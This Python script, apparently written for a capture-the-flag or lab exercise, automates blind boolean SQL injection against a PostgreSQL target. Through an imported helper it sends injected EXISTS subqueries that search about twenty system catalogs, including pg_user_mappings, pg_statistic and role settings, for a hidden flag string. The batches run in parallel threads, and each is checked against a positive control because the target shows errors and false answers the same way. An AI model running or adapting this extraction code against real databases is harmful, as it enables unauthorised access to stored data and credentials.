#!/usr/bin/env python
"""Sweep the remaining catalog places a literal can hide in.

Two rules this obeys:
  * on this target a SQL error and a false answer look identical (both render null), so every
    batch is gated by a positive control that MUST be true; if the control fails, the batch
    proves nothing;
  * the payload is lower-cased, so hunt `sun` (lowercase) and a brace with LIKE/ILIKE rather
    than a regex, which is what tripped the previous attempt.
"""
import threading

import extract as E

CTRL = "EXISTS(SELECT 1 FROM (SELECT 'aaa sun bbb'::text x) t WHERE (t.*)::text ILIKE '%sun%' OR (t.*)::text LIKE '%{%')"

SPECS = [
    ("pg_attribute.attmissingval",
     "SELECT * FROM pg_attribute WHERE attmissingval IS NOT NULL"),
    ("pg_class.reloptions", "SELECT * FROM pg_class WHERE array_to_string(reloptions,',') ~ '.'"),
    ("pg_namespace.nspoptions", "SELECT * FROM pg_namespace WHERE array_to_string(nspoptions,',') ~ '.'"),
    ("pg_attribute.attoptions", "SELECT * FROM pg_attribute WHERE attoptions IS NOT NULL"),
    ("constraint defs", "SELECT oid, pg_get_constraintdef(oid) AS d FROM pg_constraint"),
    ("pg_trigger.tgqual", "SELECT * FROM pg_trigger WHERE tgqual IS NOT NULL"),
    ("pg_foreign_server", "SELECT * FROM pg_foreign_server"),
    ("pg_foreign_table", "SELECT * FROM pg_foreign_table"),
    ("pg_index.idxoptions", "SELECT * FROM pg_index WHERE idxoptions IS NOT NULL"),
    ("pg_type typmodin?", "SELECT * FROM pg_type WHERE typname LIKE '%secret%'"),
    ("pg_ts_config", "SELECT * FROM pg_ts_config"),
    ("pg_am", "SELECT * FROM pg_am"),
    ("pg_database setconfig", "SELECT d.datname, s.setconfig FROM pg_database d LEFT JOIN pg_db_role_setting s ON s.setdatabase=d.oid"),
    ("pg_db acl", "SELECT array_to_string(datacl,',') AS a FROM pg_database"),
    ("pg_publication_tables", "SELECT * FROM pg_publication_tables"),
    ("pg_subscription", "SELECT * FROM pg_subscription"),
    ("pg_replication_slots", "SELECT * FROM pg_replication_slots"),
    ("pg_user_mappings", "SELECT * FROM pg_user_mappings"),
    ("pg_statistic all vals",
     "SELECT starelid::regclass::text AS r, stavalues1::text AS v FROM pg_statistic WHERE stavalues1 IS NOT NULL"),
    ("planets row 9 in seq", "SELECT * FROM planets_id_seq"),
]


def hit(expr):
    return "EXISTS(SELECT 1 FROM (%s) t WHERE (t.*)::text ILIKE '%%sun%%' OR (t.*)::text LIKE '%%{%%')" % expr


if __name__ == "__main__":
    print("[*] control (must be True):", E.cond(CTRL), flush=True)
    res = {}

    def one(k, e):
        try:
            res[k] = E.cond(hit(e))
        except Exception as ex:
            res[k] = "EXC"

    ts = [threading.Thread(target=one, args=(k, e), daemon=True) for k, e in SPECS]
    for t in ts:
        t.start()
    for t in ts:
        t.join(120)
    for k, _ in SPECS:
        print("   %-30s %s" % (k, res.get(k)))
